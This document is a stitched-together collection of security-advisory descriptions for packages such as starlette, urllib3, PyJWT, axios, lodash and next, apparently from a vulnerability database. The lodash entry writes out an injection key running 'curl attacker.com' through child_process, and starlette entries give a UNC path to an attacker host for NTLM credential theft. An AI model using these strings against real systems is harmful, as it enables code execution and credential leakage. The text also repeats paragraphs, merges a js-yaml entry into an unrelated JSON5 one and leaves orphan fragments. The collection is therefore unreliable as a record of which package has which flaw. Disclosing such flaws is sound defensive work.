Affected versions of starlette are vulnerable to Server-Side Request Forgery (SSRF). Serving static files with Starlette's StaticFiles app on Windows resolves requested paths with os.path.realpath() before checking directory containment. A request for a UNC path (e.g. \\attacker.com\share) triggers an outbound SMB connection, letting an unauthenticated attacker perform server-side request forgery and leak the service account's NTLMv2 credentials.

Affected versions of starlette are vulnerable to Improper Validation of Unsafe Equivalence in Input / Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling'). Starlette reconstructs `request.url` (and `request.base_url`) from the unvalidated HTTP `Host` header. An attacker can send a malformed `Host` header containing `/`, `?`, or `#` to shift the parsed path/query boundaries, making `request.url.path` diverge from the path the ASGI server actually routed against. Middleware or endpoints that apply path-based security restrictions using `request.url` can be bypassed.

Affected versions of starlette are vulnerable to Allocation of Resources Without Limits or Throttling. Calling `request.form()` parses `application/x-www-form-urlencoded` bodies without enforcing the `max_fields` or `max_part_size` limits, so an unauthenticated attacker can send a request with an extremely large number of fields or an oversized field value to exhaust CPU/memory and cause a denial of service.

Affected versions of starlette are vulnerable to Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection'). Starlette resolves HTTPEndpoint request handlers by lowercasing the client-supplied HTTP method and looking it up as an instance attribute with getattr(), without restricting the lookup to standard HTTP verbs. An attacker can send a non-standard HTTP method (e.g. `_DO_DELETE`) whose lowercased name matches an internal helper method (e.g. `_do_delete`) on an HTTPEndpoint subclass, invoking that method as if it were a request handler and bypassing the authorization checks applied by the intended public handlers.
Affected versions of Starlette are vulnerable to Improper Input Validation / Use of Incorrectly-Resolved Name or Reference.

Affected versions of urllib3 are vulnerable to Improper Handling of Highly Compressed Data (Data Amplification). urllib3 fails to enforce its decompression-bomb safeguards in two streaming-API code paths: (1) the second and subsequent HTTPResponse.read(amt=N) or HTTPResponse.stream(amt=N) calls on a Brotli-encoded response, and (2) HTTPResponse.drain_conn() invoked after the body has been partially decompressed. A malicious server can return a highly compressed payload to force the client to fully decompress it in a single operation, consuming excessive CPU and memory.

Affected versions of urllib3 are vulnerable to Exposure of Sensitive Information to an Unauthorized Actor. HTTP pools obtained from urllib3 ProxyManager via connection_from_url() or connection_from_host() do not strip sensitive headers (Authorization, Cookie, Proxy-Authorization) when following cross-origin redirects, leaking authentication credentials to the redirect target. Use ProxyManager.request() (the high-level API) instead, or upgrade to urllib3 >= 2.7.0.

Internationalized Domain Names in Applications (IDNA) for Python provides support for Internationalized Domain Names in Applications (IDNA) and Unicode IDNA Compatibility Processing. In versions prior to 3.15, payloads such as `"\u0660" * N` or `"\u30fb" * N + "\u6f22"` utilize the `valid_contexto` function prior to length rejection, and for high values of `N` will take a long time to process. This is the same issue as CVE-2024-3651, however the original remediation in 2024 was not a complete fix. A specially crafted argument to the `idna.encode()` function could consume significant resources. This may lead to a denial-of-service. Starting in version 3.14, the function rejects long inputs as soon as practicable prior to any further processing to minimize resource consumption. In version 3.15, this approach was extended to lesser used alternate functions (i.e. per-label conversions and codec support). A workaround is available. Domain names cannot exceed 253 characters in length. If this length limit is enforced prior to passing the domain to the `idna.encode()` function, it should no longer consume significant resources. This is triggered by arbitrarily large inputs that would not occur in normal usage, but may be passed to the library assuming there is no preliminary input validation by the higher-level application.

This affects the server only (socketio.Server and socketio.AsyncServer); client usage is not affected.

Affected versions of starlette are vulnerable to Server-Side Request Forgery (SSRF). Serving static files with Starlette's StaticFiles app on Windows resolves requested paths with os.path.realpath() before checking directory containment. A request for a UNC path (e.g. \\attacker.com\share) triggers an outbound SMB connection, letting an unauthenticated attacker perform server-side request forgery and leak the service account's NTLMv2 credentials.

Affected versions of starlette are vulnerable to Inefficient Algorithmic Complexity / Uncontrolled Resource Consumption. A malicious HTTP Range header can trigger quadratic-time processing in Starlette's FileResponse `_parse_range_header` (both in the regex findall and the range-merge loop). Affected versions of starlette are vulnerable to Allocation of Resources Without Limits or Throttling. Affected versions of urllib3 are vulnerable to Allocation of Resources Without Limits or Throttling. The vulnerability in urllib3 arises because a malicious server can provide an unbounded chain of content-encoding layers that urllib3 will fully decompress, causing unrestrained CPU usage and memory growth.

PyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, PyJWKClient passes its uri argument directly to urllib.request.urlopen() which uses Python stdlib's default OpenerDirector registering HTTPHandler, HTTPSHandler, FTPHandler, FileHandler, and DataHandler. There is currently no documented option to restrict which schemes PyJWKClient will fetch. If an application's jku URL ingestion path accepts attacker-influenced URLs (e.g., from JWT header, configuration file, OAuth flow parameter), the attacker can cause PyJWKClient to read arbitrary local files via file:// (SSRF on local filesystem), cause PyJWKClient to attempt FTP / data-URI fetches (broader SSRF surface), or forge tokens that PyJWT verifies as valid. The library does not directly return non-HTTP(S) URI contents to the attacker; the chained "plant a JWKS to forge tokens" scenario described in the original report requires additional application-layer flaws (attacker write access to a filesystem path, untrusted jku derivation) that this fix does not address. This vulnerability is fixed in 2.13.0.

PyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, PyJWKClient.get_signing_key() forces a fresh HTTP request to the JWKS endpoint for every JWT with an unknown kid value, with no rate limiting. Since kid comes from the unverified token header, an attacker can trigger unlimited outbound requests. The vulnerability surfaces only when a JWKS fetch fails; an attacker can attempt to provoke that with sustained unknown-kid traffic, but the outcome depends on upstream JWKS-endpoint behavior (rate limiting, transient errors) which is beyond the attacker's control. This vulnerability is fixed in 2.13.0.

PyJWT is a JSON Web Token implementation in Python. From 2.8.0 to 2.12.1, when verifying detached JWS tokens using the unencoded-payload option ("b64": false, RFC 7797), PyJWT performs Base64URL decoding of the compact-serialization payload segment before enforcing the detached-payload rules. For b64=false, PyJWT later discards that decoded payload and replaces it with the caller-provided detached_payload. In practice, this turns the middle segment into an attacker-controlled “work amplifier”: a remote client can supply an arbitrarily large Base64URL payload segment that forces CPU work + memory allocations even if the signature is invalid. This creates an unauthenticated DoS vector against any endpoint that verifies detached JWS using PyJWT. This vulnerability is fixed in 2.13.0.

Internationalized Domain Names in Applications (IDNA): Specially crafted inputs to idna.encode() can bypass CVE-2024-3651 fix

Internationalized Domain Names in Applications (IDNA) for Python provides support for Internationalized Domain Names in Applications (IDNA) and Unicode IDNA Compatibility Processing. In versions prior to 3.15, payloads such as `"\u0660" * N` or `"\u30fb" * N + "\u6f22"` utilize the `valid_contexto` function prior to length rejection, and for high values of `N` will take a long time to process. This is the same issue as CVE-2024-3651, however the original remediation in 2024 was not a complete fix. A specially crafted argument to the `idna.encode()` function could consume significant resources. This may lead to a denial-of-service. Starting in version 3.14, the function rejects long inputs as soon as practicable prior to any further processing to minimize resource consumption. In version 3.15, this approach was extended to lesser used alternate functions (i.e. per-label conversions and codec support). A workaround is available. Domain names cannot exceed 253 characters in length. If this length limit is enforced prior to passing the domain to the `idna.encode()` function, it should no longer consume significant resources. This is triggered by arbitrarily large inputs that would not occur in normal usage, but may be passed to the library assuming there is no preliminary input validation by the higher-level application.

A request for a UNC path (e.g. \\attacker.com\share) triggers an outbound SMB connection, letting an unauthenticated attacker perform server-side request forgery and leak the service account's NTLMv2 credentials.

Affected versions of starlette are vulnerable to Improper Validation of Unsafe Equivalence in Input / Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling'). Starlette reconstructs `request.url` (and `request.base_url`) from the unvalidated HTTP `Host` header. An attacker can send a malformed `Host` header containing `/`, `?`, or `#` to shift the parsed path/query boundaries, making `request.url.path` diverge from the path the ASGI server actually routed against. Middleware or endpoints that apply path-based security restrictions using `request.url` can be bypassed.

Affected versions of starlette are vulnerable to Allocation of Resources Without Limits or Throttling. Calling `request.form()` parses `application/x-www-form-urlencoded` bodies without enforcing the `max_fields` or `max_part_size` limits, so an unauthenticated attacker can send a request with an extremely large number of fields or an oversized field value to exhaust CPU/memory and cause a denial of service.

Affected versions of starlette are vulnerable to Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection'). Starlette resolves HTTPEndpoint request handlers by lowercasing the client-supplied HTTP method and looking it up as an instance attribute with getattr(), without restricting the lookup to standard HTTP verbs. An attacker can send a non-standard HTTP method (e.g. `_DO_DELETE`) whose lowercased name matches an internal helper method (e.g. `_do_delete`) on an HTTPEndpoint subclass, invoking that method as if it were a request handler and bypassing the authorization checks applied by the intended public handlers.
Affected versions of Starlette are vulnerable to Improper Input Validation / Use of Incorrectly-Resolved Name or Reference.

Internationalized Domain Names in Applications (IDNA) for Python provides support for Internationalized Domain Names in Applications (IDNA) and Unicode IDNA Compatibility Processing. In versions prior to 3.15, payloads such as `"\u0660" * N` or `"\u30fb" * N + "\u6f22"` utilize the `valid_contexto` function prior to length rejection, and for high values of `N` will take a long time to process. This is the same issue as CVE-2024-3651, however the original remediation in 2024 was not a complete fix. A specially crafted argument to the `idna.encode()` function could consume significant resources. This may lead to a denial-of-service. Starting in version 3.14, the function rejects long inputs as soon as practicable prior to any further processing to minimize resource consumption. In version 3.15, this approach was extended to lesser used alternate functions (i.e. per-label conversions and codec support). A workaround is available. Domain names cannot exceed 253 characters in length. If this length limit is enforced prior to passing the domain to the `idna.encode()` function, it should no longer consume significant resources. This is triggered by arbitrarily large inputs that would not occur in normal usage, but may be passed to the library assuming there is no preliminary input validation by the higher-level application.

Affected versions of urllib3 are vulnerable to Improper Handling of Highly Compressed Data (Data Amplification). Affected versions of urllib3 are vulnerable to Allocation of Resources Without Limits or Throttling. Affected versions of urllib3 are vulnerable to Improper Handling of Highly Compressed Data (Data Amplification). This can cause excessive CPU usage and large memory allocations on the client (resource exhaustion), resulting in a denial-of-service.

Affected versions of urllib3 are vulnerable to Exposure of Sensitive Information to an Unauthorized Actor. Affected versions of @babel/helpers, @babel/runtime, @babel/runtime-corejs2, and @babel/runtime-corejs3 are vulnerable to Inefficient Regular Expression Complexity. The vulnerable code is generated polyfill code rather than a symbol you call directly, so any project transpiling named capturing groups against affected browser targets is at risk. Upgrade to a patched version and recompile your code to remediate.

Affected versions of axios are vulnerable to Server-Side Request Forgery (SSRF). Axios can be tricked into sending requests to arbitrary domains when provided with an absolute URL—even if a baseURL is configured—resulting in a potential SSRF and credential leakage vulnerability. If an attacker can control the URL input, they might cause sensitive headers (such as API keys) to be sent to an unintended destination or gain access to internal network resources. Note that unsanitized input should NEVER be sent to any axios function, as they all pose a risk of SSRF.

Affected versions of axios are vulnerable to Allocation of Resources Without Limits or Throttling. The Node.js HTTP adapter in Axios blindly decodes data: URIs entirely into memory—ignoring maxContentLength, maxBodyLength, and even responseType: stream —so an attacker can supply a huge Base64-encoded data: URL to exhaust heap memory and crash the process (DoS).
Affected versions of axios are vulnerable to Server-Side Request Forgery (SSRF). If the function is building off of a base URL, the attacker can craft a URL that will be requested by the server.

Affected versions of axios are vulnerable to Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting') / Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution'). When Object.prototype is polluted (anywhere in the dependency tree) with `Symbol.toStringTag`, `append`, and `getHeaders`, axios's Node.js HTTP adapter mistakes a plain-object body for FormData via a duck-type check and merges the inherited `Object.prototype.getHeaders()` return value into the outgoing request headers, allowing an attacker to inject arbitrary headers (e.g. Authorization, Cookie, X-Forwarded-For) into any axios request that carries a body.

Affected versions of axios are vulnerable to Inefficient Regular Expression Complexity / Uncontrolled Resource Consumption. axios is vulnerable to a regular expression denial of service (ReDoS). The internal `cookies.read()` helper in `lib/helpers/cookies.js` builds a regular expression by concatenating the cookie name directly into the pattern without escaping regex metacharacters. When the cookie name flowing into the XSRF cookie read (e.g. via `xsrfCookieName`) contains a catastrophic-backtracking payload, evaluating the regex against `document.cookie` can freeze the JavaScript event loop, causing a denial of service in the browser tab or in Node.js/SSR applications. The affected code path is reached during ordinary axios request processing, so any importer of an affected version is exposed. Upgrade to a patched version (0.32.0 or 1.16.0), or set `xsrfCookieName: null` to disable XSRF cookie reading.

Affected versions of axios are vulnerable to Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting') / Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling') / Server-Side Request Forgery (SSRF). The vulnerability fires on ordinary axios usage with no specific API call or configuration required; upgrade to axios 1.16.0 or later.

Affected versions of axios are vulnerable to Server-Side Request Forgery (SSRF) / Unintended Proxy or Intermediary ('Confused Deputy'). If an attacker can influence request URLs, they may force local/internal Axios traffic through an attacker-controlled proxy, undermining SSRF protections and exposing sensitive responses.

Affected versions of flatted are vulnerable to Uncontrolled Recursion. `flatted.parse()` is vulnerable to a denial-of-service due to unbounded recursion in its internal `revive()` phase when resolving circular references. A maliciously crafted flatted-JSON payload containing deeply nested and/or self-referential `$` index references can trigger excessive recursion, causing a "Maximum call stack size exceeded" stack overflow and crashing the Node.js process. Applications that parse untrusted input with `flatted.parse()` can be taken down by an unauthenticated attacker with a single request.

Affected versions of flatted are vulnerable to Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution'). The parse() and fromJSON() entry points in flatted deserialize through parse(); attacker-controlled index strings can be used as array keys without numeric validation. Crafted payloads using keys such as __proto__ can surface Array.prototype as an ordinary parsed value; if downstream code assigns properties on that reference, the global prototype chain can be polluted, enabling denial of service or unsafe behavior.

Affected versions of follow-redirects are vulnerable to Improper Input Validation / Url Redirection To Untrusted Site ('Open Redirect'). The vulnerability resides in the inadequate input validation of the `url.parse()` function, utilized by the `get` and `request` functions, wherein manipulation can occur, leading to a misinterpretation of the hostname and enabling an attacker to potentially redirect traffic to a malicious site, consequently resulting in information disclosure, phishing attacks, or other security breaches.

Affected versions of follow-redirects are vulnerable to Exposure of Sensitive Information to an Unauthorized Actor. follow-redirects before 1.15.6 only clears the Authorization and Cookie headers when following a cross-domain redirect, but keeps the Proxy-Authorization header, leaking proxy credentials to the redirect target host.

Affected versions of form-data are vulnerable to Improper Neutralization of CRLF Sequences ('CRLF Injection'). form-data does not escape carriage return, line feed, or double-quote characters in the field name and `filename` option passed to `FormData#append()`. These values are concatenated directly into the `Content-Disposition` header, so passing untrusted input as a field name or filename lets an attacker inject CRLF sequences and smuggle additional multipart headers/parts (e.g. overriding backend-trusted fields).

Affected versions of form-data are vulnerable to Use of Insufficiently Random Values. form-data generates its multipart boundary using Math.random(), which is predictable if an attacker can observe PRNG outputs. By determining the boundary value, an attacker can embed that boundary in a user-controlled field and inject arbitrary extra parameters into the multipart payload, potentially manipulating or appending fields in downstream HTTP requests.

Affected versions of got are vulnerable to URL Redirection to Untrusted Site ('Open Redirect'). The vulnerability is the susceptibility to Open Redirect, stemming from the absence of verification for requested URLs, thereby enabling redirection of victims to a UNIX socket.

http-cache-semantics versions before 4.1.1 are vulnerable to Inefficient Regular Expression Complexity leading to Denial of Service. The issue can be exploited via malicious request header values sent to a server, when that server reads the cache policy from the request using this library.

Affected versions of js-yaml are vulnerable to Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution'). js-yaml is vulnerable to prototype pollution through its YAML merge key (`<<`) handling. When parsing untrusted YAML with `load`, `loadAll`, `safeLoad`, or `safeLoadAll`, a crafted document containing a `__proto__` key inside a merged mapping can modify the prototype of the resulting object, leading to integrity violations in the application.

Affected versions of js-yaml are vulnerable to Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution'). js-yaml is vulnerable to prototype pollution through its YAML merge key (`<<`) handling. The parse method of the JSON5 library before and including version 2.2.1 does not restrict parsing of keys named __proto__, allowing specially crafted strings to pollute the prototype of the resulting object. This vulnerability pollutes the prototype of the object returned by JSON5.parse and not the global Object prototype, which is the commonly understood definition of Prototype Pollution. However, polluting the prototype of a single object can have significant security impact for an application if the object is later used in trusted operations.

Affected versions of lodash, lodash-amd, lodash-es, and lodash.template are vulnerable to Improper Control of Generation of Code ('Code Injection'). The fix for CVE-2021-23337 added validation for the variable option in _.template but did not apply the same validation to options.imports key names. Both paths flow into the same Function() constructor sink. When an application passes untrusted input as options.imports key names, an attacker can inject default-parameter expressions — for example, a key such as x=process.getBuiltinModule("child_process").execSync("curl attacker.com") — that execute arbitrary code at template compile time. Additionally, _.template uses assignInWith to merge imports, which enumerates inherited properties via for..in; if Object.prototype has been polluted by any prior gadget, the polluted keys are silently absorbed into the imports object and passed to Function(). NOTE: The package `lodash.template` has been depreacted and the author suggested to use `eta` instead.
Affected versions of lodash, lodash-amd, lodash-es, and lodash.unset are vulnerable to Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution').
Affected versions of lodash, lodash-amd, lodash-es, and lodash.unset are vulnerable to Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution').

Affected versions of micromatch are vulnerable to Inefficient Regular Expression Complexity. An attacker can cause a Regular Expression Denial of Service (ReDoS) by supplying a crafted glob pattern (an opening brace with no closing brace) to the micromatch brace-expansion functions. The greedy `/{.*}/` test inside `micromatch.braces()` backtracks excessively and hangs the process. Only `micromatch.braces`, `micromatch.braceExpand`, and `micromatch.parse` route the pattern argument through this vulnerable code path.

Affected versions of minimatch are vulnerable to Inefficient Regular Expression Complexity. `minimatch` is vulnerable to Regular Expression Denial of Service (ReDoS): if an attacker can supply a glob pattern containing many consecutive `*` wildcards followed by a literal that is absent from the target string, the generated `RegExp` (many repeated `[^/]*?` groups) can trigger exponential backtracking in V8, causing a single `minimatch()` call to consume excessive CPU and hang the process.

Affected versions of minimatch are vulnerable to Inefficient Algorithmic Complexity. `minimatch()` can be forced into extreme CPU usage (event loop starvation / DoS) when matching non‑matching paths against attacker-controlled glob patterns containing multiple non-adjacent `**` (globstar) segments. In `matchOne()`, each globstar triggers unbounded recursive backtracking over all remaining path suffixes, with no memoization or budget limit, causing binomial/exponential growth in work and allowing small crafted patterns to stall a Node.js process for seconds to tens of seconds per call.

Affected versions of minimatch are vulnerable to Inefficient Regular Expression Complexity. `minimatch()` is vulnerable to Regular Expression Denial of Service (ReDoS) when processing attacker-controlled extglob patterns: nested `*()` or `+()` extglobs are compiled into regexes with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which can trigger catastrophic backtracking in V8 and stall the Node.js event loop for seconds to minutes when matched against a crafted non-matching path string.

yaml versions >= 2.0.0-5 before 2.2.2 are vulnerable to Uncaught Exception. The packages documentation states the parseDocument() and parseAllDocuments() functions should never throw an exception, however, when these functions are fed an invalid input with >= 80 carriage return characters (\r), an exception is thrown, which originates in the prettifyError() function. Code that parses user-supplied YAML input and relies on parseDocument or parseAllDocuments never throwing are vulnerable to denial of service attacks.

Affected versions of nanoid are vulnerable to Loop with Unreachable Exit Condition ('Infinite Loop'). nanoid generators (nanoid, customAlphabet, customRandom) corrupt their internal random-byte pool offset when called with a fractional (non-integer) size argument. Depending on the runtime this causes an infinite loop on `while (size--)`, returns predictable zero-filled output until the buffer refills, or throws on buffer allocation, leading to denial of service or weak/predictable IDs.
Affected versions of next are vulnerable to Server-Side Request Forgery (SSRF). An attacker can make requests that appear to be originating from the Next.js application server itself.

Affected versions of next are vulnerable to Uncontrolled Recursion. An attacker can send a crafted HTTP request to the built-in Next.js image optimization endpoint (`/_next/image`) with a URL-encoded or absolute self-referential `url` parameter that bypasses the recursion guard, causing the server to recursively optimize images until CPU is exhausted, resulting in a Denial of Service.

Affected versions of next are vulnerable to Allocation of Resources Without Limits or Throttling. An attacker can send a specially crafted HTTP request to any Next.js App Router Server Function endpoint that, when deserialized by the underlying React Server Components (Flight) runtime, triggers excessive CPU usage—exhausting the server process and resulting in a denial-of-service. The vulnerable deserialization path is part of the App Router's HTTP route handler, so any Next.js application that uses the App Router is reachable without any explicit Server Action declared in user code.

Affected versions of next are vulnerable to Improper Input Validation. Next.js Image Optimization (`/_next/image`) is affected by two related vulnerabilities fixed together. First, regardless of configuration, the image optimizer forwarded all inbound request headers — including cookies and authentication tokens — to internal API routes when proxying relative image URLs (e.g. `/_next/image? url=/api/private-endpoint`), allowing an attacker to make authenticated requests to internal endpoints through the public image optimizer. Second, if `images.domains` or `images.remotePatterns` is configured, an attacker who controls an allowed external image server can serve non-image content that bypasses magic-number content-type detection; Next.js falls back to the upstream `Content-Type` header and serves the arbitrary payload as a file download under the trusted application domain — enabling phishing, drive-by downloads, or malicious file delivery.

Affected versions of serialize-javascript are vulnerable to Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'). The `serialize()` function in `serialize-javascript` does not HTML-escape the string representation of `URL` objects, allowing injection of raw `</script>` sequences and other HTML-special characters. An attacker who controls a URL value passed to `serialize()` can break out of an inline `<script>` tag context and execute arbitrary JavaScript, causing cross-site scripting (XSS).

Affected versions of serialize-javascript are vulnerable to Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection'). `serialize-javascript` is vulnerable to code injection when serializing non-plain objects that masquerade as `RegExp` or `Date`. The library sanitizes `RegExp.source` but interpolates `RegExp.flags` (and similarly the result of `Date.prototype.toISOString()`) directly into the generated JavaScript without escaping, allowing an attacker who controls the input to `serialize()` to inject arbitrary JavaScript into the serialized output. If the consumer later evaluates that string (e.g., via `eval`, `new Function`, or embedding in a `<script>` tag), the injected payload executes and can lead to remote code execution in Node.js.
Affected versions of serialize-javascript are vulnerable to Excessive Iteration / Uncontrolled Resource Consumption.

Affected versions of next are vulnerable to Use of Cache Containing Sensitive Information. This allows auth-gated or user-specific image responses to be cached under a shared key and served to unauthenticated or differently-authenticated users.

Affected versions of axios are vulnerable to Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution'). An attacker can exploit this vulnerability by polluting Object.prototype via another dependency in the same Node.js process. Axios reads five HTTP adapter config properties (auth, baseURL, socketPath, beforeRedirect, insecureHTTPParser) via direct property access without hasOwnProperty guards, so the polluted values are silently picked up on every outbound HTTP request. This enables Authorization header credential injection, request hijacking via baseURL redirection, SSRF to internal Unix sockets, attacker-controlled callback execution during redirects, and request smuggling via the insecure HTTP parser.

Affected versions of axios are vulnerable to Permissive List of Allowed Inputs / Server-Side Request Forgery (SSRF) / Unintended Proxy or Intermediary ('Confused Deputy'). Axios contains an incomplete fix for CVE-2025-62718. The internal `isLoopback()` helper in `lib/helpers/shouldBypassProxy.js` recognizes only `127.0.0.1`, `localhost`, and `::1` as loopback addresses, instead of the entire `127.0.0.0/8` subnet defined by RFC 1122 §3.2.1.3. Any Node-side Axios request whose target host falls in `127.0.0.0/8` but is not literally `127.0.0.1` (e.g., `127.0.0.2`, `127.1.2.3`) is silently routed through the configured `HTTP_PROXY`/`HTTPS_PROXY` even when `NO_PROXY` is set to exempt loopback. This enables SSRF, exposes internal/loopback-bound services (e.g., sidecars, metrics agents, vault helpers listening on `127.0.0.X`), and may leak request headers, credentials, and bodies to a proxy intermediary.

Affected versions of axios are vulnerable to Improper Check for Unusual or Exceptional Conditions / Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution'). Affected versions of axios are vulnerable to Insertion of Sensitive Information Into Sent Data. Affected versions of axios are vulnerable to Improper Control of Generation of Code ('Code Injection') / Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution'). axios contains a prototype-pollution gadget in its config merge pipeline. Affected versions of axios are vulnerable to Exposure of Sensitive Information to an Unauthorized Actor. When a request traverses an authenticated proxy and is then redirected to a URL that no longer routes through that proxy, the stale `Proxy-Authorization` header persists on the redirected request and is exposed to the (potentially attacker-controlled) redirect target, disclosing the proxy username and password. Upgrade to axios >= 1.16.0 or >= 0.32.0.

Affected versions of urllib3 are vulnerable to Improper Handling of Highly Compressed Data (Data Amplification). Affected versions of urllib3 are vulnerable to Improper Handling of Highly Compressed Data (Data Amplification). An attacker hosting a highly-compressed HTTP response can trigger urllib3's streaming API to decompress entire compressed blocks when the client requests only a small chunk (via stream(), read(), read1(), read_chunked(), or readinto()). This can cause excessive CPU usage and large memory allocations on the client (resource exhaustion), resulting in a denial-of-service.

Affected versions of urllib3 are vulnerable to Exposure of Sensitive Information to an Unauthorized Actor. Use ProxyManager.request() (the high-level API) instead, or upgrade to urllib3 >= 2.7.0.
